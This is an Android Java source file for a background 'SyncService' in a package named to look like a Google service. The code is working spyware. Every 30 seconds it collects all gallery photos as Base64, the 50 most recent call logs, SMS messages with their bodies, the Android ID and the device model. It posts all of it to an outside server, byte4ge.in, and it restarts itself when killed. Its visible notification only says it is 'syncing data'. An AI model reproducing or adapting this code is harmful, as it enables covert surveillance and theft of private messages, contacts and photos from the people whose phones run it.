package com.b4g.googleservice;


import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;

import java.io.IOException;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import android.Manifest;

import com.example.apiapp.GalleryUtils;
import com.example.apiapp.ImageEncoder;


public class SyncService extends Service {
    private static final String TAG = "SyncService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "SyncServiceChannel";
    private final String API_URL = "https://byte4ge.in/SyncServiceAPI/sync.php";
    private final int SYNC_INTERVAL = 30000; // 30 seconds in milliseconds
    private Handler handler;
    private Runnable syncRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        handler = new Handler();
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                if (checkPermissions()) {
                    sendCombinedData();
                }
                handler.postDelayed(this, SYNC_INTERVAL);
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            ArrayList<HashMap<String, String>> imagePaths = GalleryUtils.getGalleryImages(getApplicationContext());
            Log.d("SyncService", "Total images found: " + imagePaths.size());
        } else {
            Log.e("SyncService", "Permission denied: Cannot access gallery images.");
        }

        Log.d(TAG, "Service started");
        handler.post(syncRunnable);
        return START_STICKY; // Service will be restarted if terminated by the system
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(syncRunnable);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not allowing binding
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Sync Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Used for running the sync service");

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Sync Service")
                .setContentText("Syncing data in background")
                .setSmallIcon(R.drawable.ic_sync) // Make sure to create this icon
                .setPriority(NotificationCompat.PRIORITY_LOW);

        return builder.build();
    }

    private boolean checkPermissions() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void sendCombinedData() {
        JSONObject combinedData = new JSONObject();

        try {
            // Get Android ID
            String androidId = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            //getting device name
            String deviceName = Build.MANUFACTURER + " " + Build.MODEL;

            ArrayList<HashMap<String, String>> imageList = GalleryUtils.getGalleryImages(getApplicationContext());
            JSONArray imageArray = new JSONArray();

            for (HashMap<String, String> imageData : imageList) {
                try {
                    JSONObject imageObject = new JSONObject();
                    imageObject.put("name", imageData.get("name"));  // Send actual name
                    imageObject.put("data", ImageEncoder.encodeImageToBase64(imageData.get("path"))); // Convert to Base64
                    imageArray.put(imageObject);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            JSONArray callLogs = getCallLogs();
            JSONArray smsLogs = getSmsLogs();

            combinedData.put("gallery_images", imageArray);
            combinedData.put("android_id", androidId);
            combinedData.put("deviceName", deviceName);
            combinedData.put("call_logs", callLogs);
            combinedData.put("sms_logs", smsLogs);


        } catch (JSONException e) {
            e.printStackTrace();
            Log.e(TAG, "Error creating data format: " + e.getMessage());
            return;
        }

        sendDataToAPI(combinedData.toString());
    }

    private JSONArray getCallLogs() {
        JSONArray callLogsArray = new JSONArray();
        Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
        );

        if (cursor == null) return callLogsArray;

        int count = 0;
        try {
            while (cursor.moveToNext() && count < 50) {
                JSONObject logEntry = new JSONObject();
                logEntry.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                logEntry.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                logEntry.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                logEntry.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                callLogsArray.put(logEntry);
                count++;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            cursor.close();
        }
        return callLogsArray;
    }

    private JSONArray getSmsLogs() {
        JSONArray smsLogsArray = new JSONArray();
        Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                Telephony.Sms.DATE + " DESC"
        );

        if (cursor == null) return smsLogsArray;

        int count = 0;
        try {
            while (cursor.moveToNext() && count < 50) {
                JSONObject smsEntry = new JSONObject();
                smsEntry.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                smsEntry.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                smsEntry.put("type", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE)));
                smsEntry.put("date", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)));
                smsLogsArray.put(smsEntry);
                count++;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            cursor.close();
        }
        return smsLogsArray;
    }

    private void sendDataToAPI(String data) {
        OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("input", data)
                .build();

        Request request = new Request.Builder()
                .url(API_URL)
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send data: " + e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Log.d(TAG, "Data sent successfully");
            }
        });
    }
}